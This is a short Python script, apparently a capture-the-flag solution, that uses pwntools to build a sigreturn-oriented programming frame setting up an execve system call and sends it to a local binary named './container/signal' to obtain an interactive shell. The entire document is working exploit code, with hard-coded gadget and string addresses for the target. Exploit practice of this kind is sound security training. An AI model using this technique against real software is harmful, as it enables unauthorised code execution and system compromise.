from pwn import *

context.arch = "amd64"

frame = SigreturnFrame()
frame.rip = 0x400099
frame.rax = 59
frame.rdi = 0x400080

print(bytes(frame))

r = process("./container/signal")
r.send(bytes(frame))
r.interactive()
